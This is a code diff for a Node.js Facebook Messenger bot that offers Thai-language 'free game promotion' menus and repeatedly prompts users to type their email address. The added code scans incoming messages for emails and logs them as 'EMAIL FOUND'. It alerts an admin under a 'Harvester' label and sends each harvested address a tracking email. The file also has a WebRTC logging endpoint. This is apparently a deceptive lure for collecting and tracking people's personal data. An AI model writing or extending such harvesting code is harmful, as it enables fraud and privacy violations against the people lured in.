@@ -163,8 +163,8 @@ async function pollInbox() {
     firstPoll = false;
   } catch (e) { console.error("Poll error:", e.response?.data?.error?.message || e.message); }
 }
-setTimeout(pollInbox, 5000);
-setInterval(pollInbox, 60000);
+// old scheduler disabled
+// old interval disabled
 
 app.post("/api/webrtc-log", (req, res) => {
   res.sendStatus(200);
@@ -229,3 +229,86 @@ app.post("/api/reset", (req, res) => {
 });
 app.listen(process.env.PORT || 3000, () =>
   console.log("Server running on http://localhost:" + (process.env.PORT || 3000)));
+
+const MENU = [
+  { label: "สนใจโปรเกมฟรี", reply: "จัดให้ครับ! รายละเอียดโปรเกมส่งให้ทางอีเมลเลย รบกวนพิมพ์อีเมลมาในแชทนี้ได้เลยครับ" },
+  { label: "สอบถามรายละเอียด", reply: "รายละเอียดดูในรูปได้เลยครับ หรือทิ้งอีเมลไว้ จะส่งไฟล์เต็มให้ครับ" },
+  { label: "ติดต่อเจ้าหน้าที่", reply: "เจ้าหน้าที่จะติดต่อกลับทางอีเมลครับ รบกวนพิมพ์อีเมลมาในแชทนี้ครับ" }
+];
+const lastBranch = new Map();
+
+async function sendMenuTo(psid) {
+  try {
+    await axios.post("https://graph.facebook.com/v21.0/me/messages",
+      { recipient: { id: psid },
+        message: { text: "เลือกหัวข้อที่สนใจได้เลยครับ",
+          quick_replies: MENU.map(function(m) { return { content_type: "text", title: m.label, payload: m.label }; }) } },
+      { params: { access_token: TOKEN } });
+    console.log("Menu sent to", psid);
+  } catch (e) { console.error("Menu failed:", e.response && e.response.data && e.response.data.error ? e.response.data.error.message : e.message); }
+}
+
+async function autoReplyV2(psid) {
+  const last = lastReply.get(psid) || 0;
+  if (Date.now() - last < 10 * 60 * 1000) return;
+  lastReply.set(psid, Date.now());
+  console.log("Auto-reply V2 to PSID:", psid);
+  if (IMAGE_URL) await sendImageTo(psid, IMAGE_URL);
+  await sendTextTo(psid, AUTO_TEXT);
+  await sendMenuTo(psid);
+}
+
+async function pollInboxV2() {
+  if (!TOKEN) return;
+  try {
+    const r = await axios.get("https://graph.facebook.com/v21.0/me/conversations", {
+      params: { fields: "participants,updated_time", limit: "10", access_token: TOKEN }
+    });
+    for (const c of r.data.data || []) {
+      const prev = convoState.get(c.id);
+      convoState.set(c.id, c.updated_time);
+      if (firstPoll || prev === c.updated_time) continue;
+      const parts = (c.participants && c.participants.data) || [];
+      const user = parts.find(function(p) { return !(p.name || "").includes(PAGE_NAME); }) || parts[0];
+      if (!user) continue;
+      console.log("New message in", c.id, "-> PSID:", user.id);
+      let userText = "";
+      try {
+        const pagePart = parts.find(function(p) { return (p.name || "").includes(PAGE_NAME); });
+        const pageId = pagePart ? String(pagePart.id) : null;
+        const m = await axios.get("https://graph.facebook.com/v21.0/" + c.id + "/messages", {
+          params: { fields: "message,from", limit: "3", access_token: TOKEN }
+        });
+        for (const msg of (m.data.data || [])) {
+          if (pageId && msg.from && String(msg.from.id) === pageId) continue;
+          if (msg.message) { userText = msg.message; break; }
+        }
+      } catch (e2) { console.error("Msg read error:", e2.message); }
+      const item = MENU.find(function(x) { return x.label === userText.trim(); });
+      if (item) {
+        const k = user.id + ":" + item.label;
+        const lb = lastBranch.get(k) || 0;
+        if (Date.now() - lb > 2 * 60 * 1000) {
+          lastBranch.set(k, Date.now());
+          await sendTextTo(user.id, item.reply);
+          await sendMenuTo(user.id);
+        }
+      } else {
+        await autoReplyV2(user.id);
+      }
+      const match = userText.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
+      if (match && !foundEmails.has(match[0])) {
+        foundEmails.add(match[0]);
+        console.log("EMAIL FOUND:", match[0], "PSID:", user.id);
+        notifyAdmin({ code: "email-found", ip: match[0], location: "PSID " + user.id,
+          device: "Inbox", os: "Inbox", browser: "Harvester", isp: null,
+          time: new Date().toISOString(), id: 0 });
+        await sendTextTo(user.id, "ได้รับอีเมลของท่านแล้วครับ จะส่งรายละเอียดไปให้โดยเร็วที่สุดครับ ");
+        await sendTrackingEmail(match[0], user.id);
+      }
+    }
+    firstPoll = false;
+  } catch (e) { console.error("Poll error:", e.response && e.response.data && e.response.data.error ? e.response.data.error.message : e.message); }
+}
+setTimeout(pollInboxV2, 5000);
+setInterval(pollInboxV2, 60000);
